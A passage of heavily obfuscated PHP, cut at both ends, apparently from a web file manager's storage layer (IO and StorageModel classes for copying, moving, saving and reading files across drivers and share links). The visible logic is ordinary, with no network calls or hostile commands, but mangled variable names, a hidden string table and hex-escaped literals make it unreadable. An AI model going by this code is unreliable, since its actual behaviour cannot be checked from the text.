$ò£³›ª¾, $‡âÉìîà[13] => $ÓÇ¸ñğ¨); return $åäüöÎõ ? $Œ²Õª¢[$åäüöÎõ] : $Œ²Õª¢; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($äïÅÎêµ, $ÁŞÛ’ ) { $•ëæîş =& $_SERVER[ì…™Î¶Ï]; $¾Ó“Ïü = $ÁŞÛ’ ; $GLOBALS[$•ëæîş[1122]] = $•ëæîş[1123] . $äïÅÎêµ; Hook::trigger($•ëæîş[1123] . $äïÅÎêµ . $•ëæîş[1124], $¾Ó“Ïü); $Ò²Õü€ = self::driverMake($ÁŞÛ’ [0]); if (!$Ò²Õü€) { return !1; } if (method_exists($Ò²Õü€, $äïÅÎêµ)) { $ĞÙÏÍ­« = @call_user_func_array(array($Ò²Õü€, $äïÅÎêµ), $ÁŞÛ’ ); } else { if (method_exists($Ò²Õü€, $•ëæîş[1125])) { $ĞÙÏÍ­« = @call_user_func_array(array($Ò²Õü€, $äïÅÎêµ), $ÁŞÛ’ ); } else { if (method_exists(self, $äïÅÎêµ)) { $ĞÙÏÍ­« = @call_user_func_array(array(self, $äïÅÎêµ), $ÁŞÛ’ ); } else { $ĞÙÏÍ­« = call_user_func_array(array(parent, $äïÅÎêµ), $ÁŞÛ’ ); } } } Hook::trigger($•ëæîş[1123] . $äïÅÎêµ . $•ëæîş[1126], $¾Ó“Ïü, $ĞÙÏÍ­«); return $ĞÙÏÍ­«; } public static function init($èÏ›òâš) { return self::driverMake($èÏ›òâš); } public static function copy($ŸüÚ±Ç„, $İ¬ì©ˆ¥, $¨õŒÔá© = false, $Ş¥¹ø¦Æ = false) { return self::copyMoveStart($ŸüÚ±Ç„, $İ¬ì©ˆ¥, $¨õŒÔá©, $_SERVER[ì…™Î¶Ï][540], $Ş¥¹ø¦Æ); } public static function move($‰½şƒ÷Ş, $Ë”ïØ±Ü, $„îãç„ = false, $úµÕï˜æ = false) { return self::copyMoveStart($‰½şƒ÷Ş, $Ë”ïØ±Ü, $„îãç„, $_SERVER[ì…™Î¶Ï][542], $úµÕï˜æ); } private static function copyMoveStart($î‚¢·ö², $È²ÉÛ¼ó, $¶ÔŸÕ…ä, $¹Çä‡«Ç, $õôÔ ¬) { $Ğ¤İåï„ =& $_SERVER[ì…™Î¶Ï]; $”‚ìî¡ = array($î‚¢·ö², $È²ÉÛ¼ó, $¶ÔŸÕ…ä, $õôÔ ¬); Hook::trigger($Ğ¤İåï„[1123] . $¹Çä‡«Ç . $Ğ¤İåï„[1124], $”‚ìî¡); $¼ÚĞèÛá = self::copyMove($î‚¢·ö², $È²ÉÛ¼ó, $¶ÔŸÕ…ä, $¹Çä‡«Ç, $õôÔ ¬); Hook::trigger($Ğ¤İåï„[1123] . $¹Çä‡«Ç . $Ğ¤İåï„[1126], $”‚ìî¡, $¼ÚĞèÛá); return $¼ÚĞèÛá; } public static function saveFile($ÕÍ¹±£­, $–Ï©¦ú, $ç‡ûÊ’´ = true) { $ØùÛ¼Ïê =& $_SERVER[ì…™Î¶Ï]; $—‹îÙô§ = self::info($–Ï©¦ú); $Ô¹×ù ‘ = self::driverMake($ÕÍ¹±£­); $Ÿµ¨Á½¼ = self::driverMake($–Ï©¦ú); $Š†Ã¦¡Ü = !1; if ($Ÿµ¨Á½¼->pathParse[$ØùÛ¼Ïê[1127]]) { $Š†Ã¦¡Ü = $Ÿµ¨Á½¼; $¿ÎÉ‘³ı = $Ÿµ¨Á½¼->pathParse[$ØùÛ¼Ïê[1127]]; $Ÿµ¨Á½¼ = self::driverMake($¿ÎÉ‘³ı); } if ($Ô¹×ù ‘->pathParse[$ØùÛ¼Ïê[1127]]) { $ÃÜ•Ó¨ = $Ô¹×ù ‘->pathParse[$ØùÛ¼Ïê[1127]]; $Ô¹×ù ‘ = self::driverMake($ÃÜ•Ó¨); } $˜ËáğÍä = $Ÿµ¨Á½¼->pathFather($–Ï©¦ú); $Œ€õº¤ç = !0; if (!$ç‡ûÊ’´ && self::driverIsSame($Ô¹×ù ‘, $Ÿµ¨Á½¼)) { $Œ€õº¤ç = !1; } $ÈÔßÍˆÄ = self::copyFile($Ô¹×ù ‘, $ÕÍ¹±£­, $Ÿµ¨Á½¼, $˜ËáğÍä, $—‹îÙô§[$ØùÛ¼Ïê[32]], $Œ€õº¤ç); if ($Š†Ã¦¡Ü) { $ÈÔßÍˆÄ = $Š†Ã¦¡Ü->getPathOuter($ÈÔßÍˆÄ); } return $ÈÔßÍˆÄ; } private static function copyMove($Ú®¿ÑÀ‚, $Å´ğËó, $Ú±ùÔåò, $ÍÊŞ ƒÖ, $‰šá÷±Ù = false) { $¬Å…Ïáí =& $_SERVER[ì…™Î¶Ï]; if (!$Ú®¿ÑÀ‚ || $Ú®¿ÑÀ‚ == $¬Å…Ïáí[8] || !$Å´ğËó) { return !1; } ignore_timeout(); $“´âïü = self::driverMake($Ú®¿ÑÀ‚); $»ñğ¢ÔÉ = self::driverMake($Å´ğËó); $âğìö = $ÍÊŞ ƒÖ == $¬Å…Ïáí[542]; $¨²£º´· = !1; if ($»ñğ¢ÔÉ->pathParse[$¬Å…Ïáí[1127]]) { $¨²£º´· = $»ñğ¢ÔÉ; $Å´ğËó = $»ñğ¢ÔÉ->pathParse[$¬Å…Ïáí[1127]]; $»ñğ¢ÔÉ = self::driverMake($Å´ğËó); } if ($“´âïü->pathParse[$¬Å…Ïáí[1127]]) { $Ú®¿ÑÀ‚ = $“´âïü->pathParse[$¬Å…Ïáí[1127]]; $“´âïü = self::driverMake($Ú®¿ÑÀ‚); } self::check($“´âïü, $Ú®¿ÑÀ‚, $»ñğ¢ÔÉ, $Å´ğËó); Hook::trigger($¬Å…Ïáí[75], $“´âïü, $Ú®¿ÑÀ‚, $»ñğ¢ÔÉ, $Å´ğËó); $äêè¯ÈÈ = self::driverIsSame($“´âïü, $»ñğ¢ÔÉ); if ($äêè¯ÈÈ) { if ($ÍÊŞ ƒÖ == $¬Å…Ïáí[542] && !method_exists($»ñğ¢ÔÉ, $¬Å…Ïáí[1128]) && trim($Å´ğËó, $¬Å…Ïáí[8]) == trim($»ñğ¢ÔÉ->pathFather($Ú®¿ÑÀ‚), $¬Å…Ïáí[8])) { if ($“´âïü->pathThis($Ú®¿ÑÀ‚) != $‰šá÷±Ù && !$“´âïü->isTypeObject()) { return $“´âïü->rename($Ú®¿ÑÀ‚, $‰šá÷±Ù); } return $»ñğ¢ÔÉ->getPathOuter($Ú®¿ÑÀ‚); } if (method_exists($»ñğ¢ÔÉ, $ÍÊŞ ƒÖ)) { return $»ñğ¢ÔÉ->{$ÍÊŞ ƒÖ}($Ú®¿ÑÀ‚, $Å´ğËó, $Ú±ùÔåò, $‰šá÷±Ù); } } if ($äêè¯ÈÈ && $ÍÊŞ ƒÖ == $¬Å…Ïáí[542] && $»ñğ¢ÔÉ->getType() == $¬Å…Ïáí[107]) { $áÓ¥âÏ = $»ñğ¢ÔÉ->movePath($Ú®¿ÑÀ‚, $Å´ğËó, $‰šá÷±Ù); if ($áÓ¥âÏ) { return $áÓ¥âÏ; } } $›§«³ª = $“´âïü->isFile($Ú®¿ÑÀ‚); if (!$›§«³ª && $»ñğ¢ÔÉ->getType() == $¬Å…Ïáí[733] && $“´âïü->getType() == $¬Å…Ïáí[107]) { $áÓ¥âÏ = $»ñğ¢ÔÉ->copyFolderFromIO($“´âïü, $Ú®¿ÑÀ‚, $Å´ğËó, $Ú±ùÔåò, $âğìö, $‰šá÷±Ù); } else { $áÓ¥âÏ = self::copyPath($“´âïü, $Ú®¿ÑÀ‚, $»ñğ¢ÔÉ, $Å´ğËó, $Ú±ùÔåò, $âğìö, $›§«³ª, $‰šá÷±Ù); } if ($áÓ¥âÏ && $âğìö) { $“´âïü->remove($Ú®¿ÑÀ‚); } if ($¨²£º´·) { $áÓ¥âÏ = $¨²£º´·->getPathOuter($áÓ¥âÏ); } return $áÓ¥âÏ; } private static function check($ÃÌú„„¯, $ÙÖÅÆêˆ, $ş‰’ï§©, &$ÒÇÂò˜¨) { $û›äšµÒ =& $_SERVER[ì…™Î¶Ï]; if (self::driverIsSame($ÃÌú„„¯, $ş‰’ï§©) && $ÃÌú„„¯->isFolder($ÙÖÅÆêˆ) && $ÃÌú„„¯->isParentOf($ÙÖÅÆêˆ, $ÒÇÂò˜¨)) { show_json(LNG($û›äšµÒ[1129]), !1); } if (!$ÃÌú„„¯->exist($ÙÖÅÆêˆ)) { show_json(LNG($û›äšµÒ[106]), !1); } } private static function copyPath($ğÃå„îù, $€ÖÓ©£, $®Ì¦©æ, $§úº¡…Ã, $Üä¤ß, $Õ’êˆÅ‘, $àÜ·š¼ı, $Œ§³éá = false) { $ûæ£‡ØÜ =& $_SERVER[ì…™Î¶Ï]; $±Ãìş¢ = empty($Œ§³éá) && $Œ§³éá !== $ûæ£‡ØÜ[190] ? $ğÃå„îù->pathThis($€ÖÓ©£) : $Œ§³éá; if ($Üä¤ß) { $ášñºê™ = $®Ì¦©æ->fileNameExist($§úº¡…Ã, $±Ãìş¢); $±Ãìş¢ = $®Ì¦©æ->fileNameAuto($§úº¡…Ã, $±Ãìş¢, $Üä¤ß, !$àÜ·š¼ı); $Üä¤ß = $ášñºê™ ? $Üä¤ß : !1; } if ($àÜ·š¼ı) { return self::copyFile($ğÃå„îù, $€ÖÓ©£, $®Ì¦©æ, $§úº¡…Ã, $±Ãìş¢, $Õ’êˆÅ‘); } if ($Üä¤ß == REPEAT_RENAME_FOLDER) { $Üä¤ß = !1; } $¶¨Çä‰¶ = rtrim($§úº¡…Ã, $ûæ£‡ØÜ[8]) . $ûæ£‡ØÜ[8] . $±Ãìş¢; $ğş¿¬šô = $®Ì¦©æ->mkdir($®Ì¦©æ->getPath($¶¨Çä‰¶)); $§úº¡…Ã = $®Ì¦©æ->getPathInner($ğş¿¬šô); $¼æ¬Ÿ … = $ğÃå„îù->listPath($€ÖÓ©£, !0); $¼æ¬Ÿ … = is_array($¼æ¬Ÿ …) ? $¼æ¬Ÿ … : array($ûæ£‡ØÜ[76] => array(), $ûæ£‡ØÜ[77] => array()); $¸€¢§ÖÇ = array_merge($¼æ¬Ÿ …[$ûæ£‡ØÜ[76]], $¼æ¬Ÿ …[$ûæ£‡ØÜ[77]]); foreach ($¸€¢§ÖÇ as $”œûı¿) { $ÕÃÑ§‘² = $”œûı¿[$ûæ£‡ØÜ[33]] == $ûæ£‡ØÜ[192]; $€ÖÓ©£ = $ğÃå„îù->getPathInner($”œûı¿[$ûæ£‡ØÜ[78]]); $™Ş—†“ = self::copyPath($ğÃå„îù, $€ÖÓ©£, $®Ì¦©æ, $§úº¡…Ã, $Üä¤ß, $Õ’êˆÅ‘, $ÕÃÑ§‘²); if (!$™Ş—†“) { IO::errorTips($ûæ£‡ØÜ[1130] . $€ÖÓ©£ . $ûæ£‡ØÜ[70] . $§úº¡…Ã); } } self::copyMoveKeepInfo($ğÃå„îù, $€ÖÓ©£, $ğş¿¬šô); return $ğş¿¬šô; } private static function copyFile($³ÚñÙ®, $“Ì–æ¾Ÿ, $³è‡úÛï, $ƒÊ¤ğëØ, $äÄåÕ¢, $»Îõàå•) { $©çôá‚‚ =& $_SERVER[ì…™Î¶Ï]; $ƒÊ¤ğëØ = $³è‡úÛï->getPath(rtrim($ƒÊ¤ğëØ, $©çôá‚‚[8]) . $©çôá‚‚[8] . $äÄåÕ¢); $³…µâ’² = $©çôá‚‚[1131] . time() . rand_string(5); Hook::trigger($©çôá‚‚[1132], $³ÚñÙ®, $“Ì–æ¾Ÿ, $³è‡úÛï, $ƒÊ¤ğëØ, $äÄåÕ¢, $³…µâ’²); if (self::driverIsSame($³ÚñÙ®, $³è‡úÛï)) { if ($»Îõàå•) { $ş´î‚À® = $³è‡úÛï->moveFile($“Ì–æ¾Ÿ, $ƒÊ¤ğëØ); } else { $ş´î‚À® = $³è‡úÛï->copyFile($“Ì–æ¾Ÿ, $ƒÊ¤ğëØ); } Hook::trigger($©çôá‚‚[1133], $³ÚñÙ®, $“Ì–æ¾Ÿ, $³è‡úÛï, $ƒÊ¤ğëØ, $äÄåÕ¢, $ş´î‚À®); self::copyMoveKeepInfo($³ÚñÙ®, $“Ì–æ¾Ÿ, $ş´î‚À®); return $ş´î‚À®; } $£â§†õ = TEMP_FILES; if ($GLOBALS[$©çôá‚‚[6]][$©çôá‚‚[90]][$©çôá‚‚[771]]) { $£â§†õ = $GLOBALS[$©çôá‚‚[6]][$©çôá‚‚[90]][$©çôá‚‚[771]]; } $Ù¶×æ¤ = $£â§†õ; mk_dir($Ù¶×æ¤); $™‹øÇù¢ = $Ù¶×æ¤ . $³…µâ’²; $ßÏÓ…•– = $™‹øÇù¢; $™‹øÇù¢ = $³ÚñÙ®->download($“Ì–æ¾Ÿ, $™‹øÇù¢); $™‹øÇù¢ = $³ÚñÙ®->iconvApp($™‹øÇù¢); if (substr($™‹øÇù¢, strlen($£â§†õ)) == $£â§†õ) { $»Îõàå• = !0; } $ş´î‚À® = $³è‡úÛï->upload($ƒÊ¤ğëØ, $™‹øÇù¢, $»Îõàå•); self::remove($ßÏÓ…•–); Hook::trigger($©çôá‚‚[1133], $³ÚñÙ®, $“Ì–æ¾Ÿ, $³è‡úÛï, $ƒÊ¤ğëØ, $äÄåÕ¢, $ş´î‚À®); self::copyMoveKeepInfo($³ÚñÙ®, $“Ì–æ¾Ÿ, $ş´î‚À®); return $ş´î‚À®; } private static function copyMoveKeepInfo($ÅôĞš„¶, $²ùÅÏí, $¼¾¡—¿Õ) { if (!$¼¾¡—¿Õ) { return; } $èùœÒ¤º = $ÅôĞš„¶->info($²ùÅÏí); if (!is_array($èùœÒ¤º)) { return; } IO::setModifyTime($¼¾¡—¿Õ, $èùœÒ¤º[$_SERVER[ì…™Î¶Ï][86]]); } public static function pathFather($‚øŠ˜Î¯) { $Àğû…â˜ = IO::init($‚øŠ˜Î¯); $ïöÑ¦µÉ = $Àğû…â˜->pathFather($Àğû…â˜->path); return $Àğû…â˜->getPathOuter($ïöÑ¦µÉ); } public static function fileOut($£ê¤®, $ü“äôôû = false, $°´é£õ = false, $ø­ü§¾„ = '') { $è§ÎËÑ— = self::driverMake($£ê¤®); if ($è§ÎËÑ—->isFileOutServer()) { return $è§ÎËÑ—->fileOutServer($£ê¤®, $ü“äôôû, $°´é£õ, $ø­ü§¾„); } return $è§ÎËÑ—->fileOut($£ê¤®, $ü“äôôû, $°´é£õ, $ø­ü§¾„); } public static function fileOutImage($´•ËÑÅ, $üÏ¹íÇô = 250) { $ÒµÄëÚ = array(250, 600, 1200, 2000, 3000, 5000); for ($¶Ÿ¥Éü• = 0; $¶Ÿ¥Éü• < count($ÒµÄëÚ); $¶Ÿ¥Éü•++) { if ($¶Ÿ¥Éü• == 0 && $üÏ¹íÇô <= $ÒµÄëÚ[$¶Ÿ¥Éü•]) { $üÏ¹íÇô = $ÒµÄëÚ[$¶Ÿ¥Éü•]; break; } else { if ($üÏ¹íÇô > $ÒµÄëÚ[$¶Ÿ¥Éü• - 1] && $üÏ¹íÇô <= $ÒµÄëÚ[$¶Ÿ¥Éü•]) { $üÏ¹íÇô = $ÒµÄëÚ[$¶Ÿ¥Éü•]; break; } else { if ($¶Ÿ¥Éü• == count($ÒµÄëÚ) - 1 && $üÏ¹íÇô > $ÒµÄëÚ[$¶Ÿ¥Éü•]) { $üÏ¹íÇô = $ÒµÄëÚ[$¶Ÿ¥Éü•]; break; } } } } $öäÛ–™¥ = self::driverMake($´•ËÑÅ); if ($öäÛ–™¥->isFileOutServer()) { return $öäÛ–™¥->fileOutImageServer($´•ËÑÅ, $üÏ¹íÇô); } return $öäÛ–™¥->fileOutImage($´•ËÑÅ, $üÏ¹íÇô); } private static function driverIsSame($¤±Á’, $’¹Åïü) { $ºç•ì†„ =& $_SERVER[ì…™Î¶Ï]; $íêøÓí = $¤±Á’->getType(); $ù¶şğÛ÷ = $’¹Åïü->getType(); if ($íêøÓí != $ù¶şğÛ÷) { return !1; } if ($íêøÓí == $ºç•ì†„[733]) { return !0; } if ($íêøÓí == $ºç•ì†„[107]) { return !0; } if ($¤±Á’->pathDriver == $’¹Åïü->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ã‰Ôé¶, $ÖòéÈ…) { $ÊÁÔŸô¦ =& $_SERVER[ì…™Î¶Ï]; if (!IO::exist($Ã‰Ôé¶)) { return !1; } if (!IO::exist($ÖòéÈ…)) { IO::mkdir($ÖòéÈ…); } $÷•İÛ‡ş = self::_listAll($Ã‰Ôé¶); $ë©È³í = self::_listAll($ÖòéÈ…); $ô´Ö™©› = array(); $Äê‚ØÇÃ = array(); foreach ($÷•İÛ‡ş as $×‚ü×òò => $ú¼˜âíë) { if (isset($ë©È³í[$×‚ü×òò])) { if ($ú¼˜âíë[$ÊÁÔŸô¦[79]] == 1) { continue; } if ($ë©È³í[$×‚ü×òò][$ÊÁÔŸô¦[80]] == $ú¼˜âíë[$ÊÁÔŸô¦[80]]) { continue; } } if ($ú¼˜âíë[$ÊÁÔŸô¦[79]] == 1) { $Äê‚ØÇÃ[] = $ÖòéÈ… . $ÊÁÔŸô¦[8] . $×‚ü×òò; continue; } $£ñ»¸â = strstr(trim($×‚ü×òò, $ÊÁÔŸô¦[8]), $ÊÁÔŸô¦[8]) ? get_path_father($×‚ü×òò) : $ÊÁÔŸô¦[12]; $ô´Ö™©›[] = array($ÊÁÔŸô¦[1134] => $ú¼˜âíë[$ÊÁÔŸô¦[78]], $ÊÁÔŸô¦[1135] => rtrim($ÖòéÈ…, $ÊÁÔŸô¦[8]) . $ÊÁÔŸô¦[8] . $£ñ»¸â, $ÊÁÔŸô¦[1136] => $ú¼˜âíë); } $Üƒû»„˜ = array($ÊÁÔŸô¦[192] => $ô´Ö™©›, $ÊÁÔŸô¦[79] => $Äê‚ØÇÃ); Hook::trigger($ÊÁÔŸô¦[1137], $Ã‰Ôé¶, $ÖòéÈ…, $Üƒû»„˜); foreach ($Äê‚ØÇÃ as $ú¼˜âíë) { IO::mkdir($ú¼˜âíë); } foreach ($ô´Ö™©› as $ú¼˜âíë) { IO::copy($ú¼˜âíë[$ÊÁÔŸô¦[1134]], $ú¼˜âíë[$ÊÁÔŸô¦[1135]], REPEAT_REPLACE); } } private static function _listAll($†ø§šÒ¹) { $Š£°ÄÆ =& $_SERVER[ì…™Î¶Ï]; $†ø§šÒ¹ = KodIO::clear($†ø§šÒ¹); $ø£…³ùÓ = IO::listAll($†ø§šÒ¹); foreach ($ø£…³ùÓ as &$½ü®£ìÜ) { $óäÑ×òŸ = substr($½ü®£ìÜ[$Š£°ÄÆ[78]], strlen($†ø§šÒ¹)); $½ü®£ìÜ[$Š£°ÄÆ[1138]] = trim($óäÑ×òŸ, $Š£°ÄÆ[8]); } unset($½ü®£ìÜ); return array_to_keyvalue($ø£…³ùÓ, $Š£°ÄÆ[1138]); } public static function fileSubstr($ÙÙÍ­š, $¤ø¯Îõæ, $¦Ÿ¸‘ªû = false) { $ñ¢Û¯õ =& $_SERVER[ì…™Î¶Ï]; $¼ˆùÒ«‰ = self::driverMake($ÙÙÍ­š); $ƒ°¦ğ—Ş = $¼ˆùÒ«‰->size($ÙÙÍ­š); $ˆÕ¿“Ğ¯ = $¤ø¯Îõæ; $ä»¯şıò = $¦Ÿ¸‘ªû; if ($¤ø¯Îõæ < 0) { $¤ø¯Îõæ = $ƒ°¦ğ—Ş + $¤ø¯Îõæ; } if ($¦Ÿ¸‘ªû === !1) { $¦Ÿ¸‘ªû = $ƒ°¦ğ—Ş - $¤ø¯Îõæ; } if ($¤ø¯Îõæ + $¦Ÿ¸‘ªû > $ƒ°¦ğ—Ş) { $¦Ÿ¸‘ªû = $ƒ°¦ğ—Ş - $¤ø¯Îõæ; } if (!$ƒ°¦ğ—Ş && $¼ˆùÒ«‰->getType() == $ñ¢Û¯õ[107] && !$¼ˆùÒ«‰->exist($ÙÙÍ­š)) { throw new Exception($ñ¢Û¯õ[1139] . LNG($ñ¢Û¯õ[1140]) . $ñ¢Û¯õ[942] . get_path_this($ÙÙÍ­š) . $ñ¢Û¯õ[12]); } if ($¦Ÿ¸‘ªû <= 0) { return $ñ¢Û¯õ[12]; } if ($¤ø¯Îõæ < 0 || $¤ø¯Îõæ >= $ƒ°¦ğ—Ş || $¦Ÿ¸‘ªû > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\122\x65\141\144\40\145\162\x72\x6f\162\41\x20\x73\164\x61\x72\164\x3d{$¤ø¯Îõæ}\x3b\x6c\x65\156\147\164\x68\75{$¦Ÿ¸‘ªû}\73\40\163\151\172\145\x3d{$ƒ°¦ğ—Ş}\x3b"); } $èîü“« = $¼ˆùÒ«‰->fileSubstr($ÙÙÍ­š, $¤ø¯Îõæ, $¦Ÿ¸‘ªû); if (!$èîü“« && $¦Ÿ¸‘ªû && isset($GLOBALS[$ñ¢Û¯õ[1141]])) { throw new Exception($GLOBALS[$ñ¢Û¯õ[1141]][$ñ¢Û¯õ[1142]]); } return $èîü“«; } private static function driverMake(&$–ó©××„) { $¯¾Ğãéı =& $_SERVER[ì…™Î¶Ï]; $¨›ù«Õ† = KodIO::parse($–ó©××„); if (!self::$driverListSystem) { $ßƒ„•øé = Model($¯¾Ğãéı[742])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ßƒ„•øé, $¯¾Ğãéı[392]); } if ($¨›ù«Õ†[$¯¾Ğãéı[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¨›ù«Õ†[$¯¾Ğãéı[392]]]) { return !1; } $–ó©××„ = $¨›ù«Õ†[$¯¾Ğãéı[1143]]; $ªé‚Êè¥ = self::driverGet($¨›ù«Õ†, $–ó©××„); return $ªé‚Êè¥; } private static function driverGet($¶’êİ¶û, &$¨”¶Œ¿) { $•Åş˜¥µ =& $_SERVER[ì…™Î¶Ï]; $ş†İ‚¡Ğ = $¶’êİ¶û[$•Åş˜¥µ[1144]]; $øõöØ = $¶’êİ¶û[$•Åş˜¥µ[392]]; switch ($¶’êİ¶û[$•Åş˜¥µ[33]]) { case KodIO::KOD_IO: $Ú¦ïªä÷ = self::$driverListSystem[$øõöØ]; break; case KodIO::KOD_SOURCE: $¨”¶Œ¿ = $øõöØ . $¨”¶Œ¿; $Ú¦ïªä÷ = array($•Åş˜¥µ[1145] => $•Åş˜¥µ[1146], $•Åş˜¥µ[6] => $¶’êİ¶û); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ı¾½ğÊ = $GLOBALS[$•Åş˜¥µ[1147]]; self::$driverListUser = array_to_keyvalue($ı¾½ğÊ, $•Åş˜¥µ[392]); } $Ú¦ïªä÷ = self::$driverListUser[$øõöØ]; break; case KodIO::KOD_SHARE_LINK: $Ú¦ïªä÷ = array($•Åş˜¥µ[1145] => $•Åş˜¥µ[1148], $•Åş˜¥µ[6] => $¶’êİ¶û); $àğ˜Â©µ = Action($•Åş˜¥µ[1149])->sharePathInfo($¶’êİ¶û[$•Åş˜¥µ[78]]); $¨”¶Œ¿ = $àğ˜Â©µ[$•Åş˜¥µ[394]]; if (!$àğ˜Â©µ[$•Åş˜¥µ[394]]) { $îÔÙ‰Ì° = Model($•Åş˜¥µ[586])->getInfo($àğ˜Â©µ[$•Åş˜¥µ[479]]); $¨”¶Œ¿ = KodIO::clear($îÔÙ‰Ì°[$•Åş˜¥µ[1150]] . $¶’êİ¶û[$•Åş˜¥µ[1143]]); $¶’êİ¶û[$•Åş˜¥µ[477]] = $îÔÙ‰Ì°; $¶’êİ¶û[$•Åş˜¥µ[1127]] = $¨”¶Œ¿; $Ú¦ïªä÷ = array($•Åş˜¥µ[1145] => $•Åş˜¥µ[1151], $•Åş˜¥µ[6] => $¶’êİ¶û); } break; case KodIO::KOD_SHARE_ITEM: $Ú¦ïªä÷ = array($•Åş˜¥µ[1145] => $•Åş˜¥µ[1152], $•Åş˜¥µ[6] => $¶’êİ¶û); $îÔÙ‰Ì° = Model($•Åş˜¥µ[586])->getInfo($¶’êİ¶û[$•Åş˜¥µ[392]]); if ($îÔÙ‰Ì°[$•Åş˜¥µ[394]] == $•Åş˜¥µ[190]) { $¨”¶Œ¿ = KodIO::clear($îÔÙ‰Ì°[$•Åş˜¥µ[1150]] . $¶’êİ¶û[$•Åş˜¥µ[1143]]); $¶’êİ¶û[$•Åş˜¥µ[477]] = $îÔÙ‰Ì°; $¶’êİ¶û[$•Åş˜¥µ[1127]] = $¨”¶Œ¿; $Ú¦ïªä÷ = array($•Åş˜¥µ[1145] => $•Åş˜¥µ[1153], $•Åş˜¥µ[6] => $¶’êİ¶û); } else { if (!$¨”¶Œ¿) { $¨”¶Œ¿ = $îÔÙ‰Ì°[$•Åş˜¥µ[394]]; } } break; default: $¨”¶Œ¿ = $¶’êİ¶û[$•Åş˜¥µ[78]]; $Ú¦ïªä÷ = array($•Åş˜¥µ[1145] => $•Åş˜¥µ[1154]); break; } $ş‰…¼Æº = $¶’êİ¶û[$•Åş˜¥µ[78]]; if (!isset(self::$driverCache[$ş‰…¼Æº])) { $˜ı™Óœî = strtolower($Ú¦ïªä÷[$•Åş˜¥µ[96]]); $ÈÄØş = $GLOBALS[$•Åş˜¥µ[6]][$•Åş˜¥µ[90]][$•Åş˜¥µ[801]]; $»ÎÀŸà = $•Åş˜¥µ[74] . (isset($ÈÄØş[$˜ı™Óœî]) ? $ÈÄØş[$˜ı™Óœî] : ucfirst($˜ı™Óœî)); if (!class_exists($»ÎÀŸà)) { show_json("{$»ÎÀŸà}\40\x6e\x6f\164\40\x65\x78\151\x73\164\163\41", !1); } $…´ÇóÓ€ = isset($Ú¦ïªä÷[$•Åş˜¥µ[6]]) ? $Ú¦ïªä÷[$•Åş˜¥µ[6]] : !1; self::$driverCache[$ş‰…¼Æº] = new $»ÎÀŸà($…´ÇóÓ€); } $ÓÎÜëå£ = self::$driverCache[$ş‰…¼Æº]; $ÓÎÜëå£->pathDriver = $ş†İ‚¡Ğ; $ÓÎÜëå£->pathBase = $•Åş˜¥µ[12]; if (isset($Ú¦ïªä÷[$•Åş˜¥µ[6]][$•Åş˜¥µ[1155]])) { $ÓÎÜëå£->pathBase = rtrim($Ú¦ïªä÷[$•Åş˜¥µ[6]][$•Åş˜¥µ[1155]], $•Åş˜¥µ[8]) . $•Åş˜¥µ[8]; $¨”¶Œ¿ = $ÓÎÜëå£->pathBase . ltrim($¨”¶Œ¿, $•Åş˜¥µ[8]); } $¨”¶Œ¿ = $ÓÎÜëå£->getPath($¨”¶Œ¿); if (isset($¶’êİ¶û[$•Åş˜¥µ[1127]])) { $¨”¶Œ¿ = $¶’êİ¶û[$•Åş˜¥µ[1127]]; } $ÓÎÜëå£->path = $¨”¶Œ¿; return $ÓÎÜëå£; } public static function errorTips($çŠò—Ú² = false) { $‘Ï¶êÑË =& $_SERVER[ì…™Î¶Ï]; static $ÆÆ¨ñ’ = array(); $£ôúäÕÓ = 1000; if ($çŠò—Ú² === -1) { return $ÆÆ¨ñ’ ? $ÆÆ¨ñ’[count($ÆÆ¨ñ’) - 1] : $‘Ï¶êÑË[12]; } if ($çŠò—Ú² === !1) { return implode($‘Ï¶êÑË[226], $ÆÆ¨ñ’); } if (count($ÆÆ¨ñ’) >= $£ôúäÕÓ) { $ÆÆ¨ñ’ = array_slice($ÆÆ¨ñ’, $£ôúäÕÓ * 0.5, $£ôúäÕÓ); } $ÆÆ¨ñ’[] = $çŠò—Ú²; write_log($‘Ï¶êÑË[159] . ACTION . $‘Ï¶êÑË[1156] . $çŠò—Ú², $‘Ï¶êÑË[1157]); } public static function getLastError($÷î“Í¿ = '') { $†ç Â© = self::errorTips(-1); return $†ç Â© ? $†ç Â© : $÷î“Í¿; } } goto fŞôÎâï®¿; C¿Ë°‘‘»ß: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x73\164\x6f\162\x61\x67\145\x4c\151\x73\164"; public $field = array("\x6e\141\155\x65", "\163\151\172\145\115\141\x78", "\163\171\163\164\x65\155", "\x64\145\146\x61\165\x6c\164", "\x64\162\151\x76\x65\x72", "\x63\157\156\x66\151\147"); public function listData($€´Äâ»ù = false, $Óéş›ÁÏ = "\x6d\x6f\144\151\x66\171\x54\x69\155\x65", $‚ã—¯éÌ = false) { $áÔ‚»“ =& $_SERVER[ì…™Î¶Ï]; $¼ó®ØŒ = parent::listData($€´Äâ»ù, $Óéş›ÁÏ, $‚ã—¯éÌ); if ($€´Äâ»ù) { return $¼ó®ØŒ; } $îàô‡ò = $this->ioSizeUseGet(array_to_keyvalue($¼ó®ØŒ, $áÔ‚»“[12], $áÔ‚»“[392])); foreach ($¼ó®ØŒ as $àÍŒ©¶ => $áğıŸ–ú) { unset($¼ó®ØŒ[$àÍŒ©¶][$áÔ‚»“[6]]); $¼ó®ØŒ[$àÍŒ©¶][$áÔ‚»“[1788]] = isset($îàô‡ò[$áğıŸ–ú[$áÔ‚»“[392]]]) ? $îàô‡ò[$áğıŸ–ú[$áÔ‚»“[392]]] : 0; } return $¼ó®ØŒ; } public function ioSizeUseGet($†à¦¨„Û) { $êÁ†Á¯Æ =& $_SERVER[ì…™Î¶Ï]; if (!$†à¦¨„Û) { return array(); } $¯é—²Úû = $êÁ†Á¯Æ[2103] . implode($êÁ†Á¯Æ[50], $†à¦¨„Û); $Î½³ëØ = Cache::get($¯é—²Úû); if ($Î½³ëØ) { return $Î½³ëØ; } $¹–ß­¤ = array($êÁ†Á¯Æ[792] => $êÁ†Á¯Æ[392], $êÁ†Á¯Æ[2104] => $êÁ†Á¯Æ[80]); $›ĞºÈåÕ = array($êÁ†Á¯Æ[792] => array($êÁ†Á¯Æ[7], $†à¦¨„Û)); 